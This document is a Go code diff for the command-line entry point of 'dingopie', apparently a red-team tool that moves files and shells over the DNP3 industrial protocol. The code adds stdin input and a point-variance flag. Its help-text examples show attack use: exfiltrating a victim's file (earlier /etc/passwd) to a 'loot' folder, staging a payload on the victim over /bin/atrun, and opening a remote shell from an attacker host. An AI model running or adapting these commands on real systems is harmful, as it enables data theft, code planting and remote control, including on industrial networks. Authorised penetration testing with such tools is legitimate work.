@@ -4,6 +4,7 @@ package cmd
 import (
 	"errors"
 	"fmt"
+	"io"
 	"os"
 	"slices"
 	"strings"
@@ -24,9 +25,10 @@ var (
 	key        string
 
 	// direct send/receive.
-	wait   time.Duration
-	file   string
-	points int
+	wait          time.Duration
+	file          string
+	points        int
+	pointVariance float32
 
 	// shell.
 	command string
@@ -45,12 +47,36 @@ func getData(file string, args []string) ([]byte, error) {
 		}
 
 		return b, nil
-	} else if len(args) > 0 {
+	}
+
+	fi, err := os.Stdin.Stat()
+	if err != nil {
+		return nil, fmt.Errorf("error checking stdin: %w", err)
+	}
+
+	if (fi.Mode() & os.ModeCharDevice) == 0 {
+		b, err := io.ReadAll(os.Stdin)
+		if err != nil {
+			return nil, fmt.Errorf("error reading stdin: %w", err)
+		}
+
+		if len(b) == 0 {
+			return nil, errors.New("no data provided to send (stdin empty)")
+		}
+
+		fmt.Printf(">> Message read from stdin\n")
+
+		return b, nil
+	}
+
+	if len(args) == 1 {
 		data := []byte(args[0])
 
 		fmt.Printf(">> Message read from command line\n")
 
 		return data, nil
+	} else if len(args) > 1 {
+		return nil, errors.New("too many arguments provided")
 	}
 
 	return nil, errors.New("no data provided to send")
@@ -60,7 +86,7 @@ func getData(file string, args []string) ([]byte, error) {
 // User Interface
 // ==================================================================
 // Two commands to help standardized UI output for all action commands.
-var mustDisplayFlag = []string{"points", "wait", "command"}
+var mustDisplayFlag = []string{"server-port", "points", "point-variance", "wait", "command"}
 
 func printCommand(cmd *cobra.Command) {
 	fmt.Println(
@@ -75,18 +101,12 @@ func printCommand(cmd *cobra.Command) {
 func dumpFlags(cmd *cobra.Command) {
 	fmt.Println(">> Flags:")
 	cmd.Flags().VisitAll(func(f *pflag.Flag) {
-		if f.Name == "server-ip" || f.Name == "server-port" {
-			return
-		} else if !f.Changed && !slices.Contains(mustDisplayFlag, f.Name) {
+		if !f.Changed && !slices.Contains(mustDisplayFlag, f.Name) {
 			return
 		}
 
-		fmt.Printf("\t%s:    \t%s\n", f.Name, f.Value)
+		fmt.Printf("\t% 14s:\t%s\n", f.Name, f.Value)
 	})
-	fmt.Printf("\tserver:    \t%s:%s\n",
-		cmd.Flags().Lookup("server-ip").Value.String(),
-		cmd.Flags().Lookup("server-port").Value.String(),
-	)
 }
 
 func preRun(cmd *cobra.Command) {
@@ -110,24 +130,24 @@ var rootCmd = &cobra.Command{
 functions: transferring files ('send' | 'receive'), and establishing
 an interactive shell ('shell' | 'connect').
 `,
-	Example: `    Exfiltrate a file:
-        # on victim
-        $ dingopie server direct send -f /etc/passwd -k "my voice is my passport"
-        # on attacker or intermediary
-        $ dingopie client direct receive -f loot/vic1-passwd.txt -k "my voice is my passport" -i 10.1.2.3
+	Example: `  Exfiltrate a file:
+    # on victim
+    $ dingopie server direct send --file black-box --key "my voice is my passport"
+    # on attacker or intermediary
+    $ dingopie client direct receive --file loot/janeks-box --key "my voice is my passport" --server-ip 10.1.2.3
 
-    Stage a payload:
-        # on victim
-        $ dingopie server direct receive --file /tmp/security-update
-        # on attacker
-        $ dingopie client direct send --file payloads/janeks-box.exe --server-ip 10.1.2.3
-
-    Tunnel a shell over DNP3:
-        # on victim
-        $ dingopie server direct shell
-        # on attacker
-        $ dingopie client direct connect --server-ip 10.1.2.3
-        dingopie> whoami`,
+  Stage a payload:
+    # on victim
+    $ dingopie server direct receive --file /bin/atrun --server-port 20001
+    # on attacker
+    $ dingopie client direct send --file payloads/egg --server-ip 128.3.6.22 --server-port 20001
+  
+  Tunnel a shell over DNP3:
+    # on victim
+    $ dingopie server direct shell
+    # on attacker
+    $ dingopie.exe client direct connect -i 131.43.110.7
+    dingopie>`,
 	PersistentPreRun: func(cmd *cobra.Command, _ []string) {
 		preRun(cmd)
 	},
@@ -140,6 +160,7 @@ an interactive shell ('shell' | 'connect').
 func Execute() {
 	err := rootCmd.Execute()
 	if err != nil {
+		fmt.Printf("Error executing dingopie: %v\n", err)
 		os.Exit(1)
 	}
 }
@@ -166,5 +187,6 @@ func init() {
 {{if .HasAvailableInheritedFlags}}Global Flags:
 {{.InheritedFlags.FlagUsages | trimTrailingWhitespaces}}{{end}}{{if .HasExample}}Examples:
 {{.Example}}{{end}}
+
 `)
 }
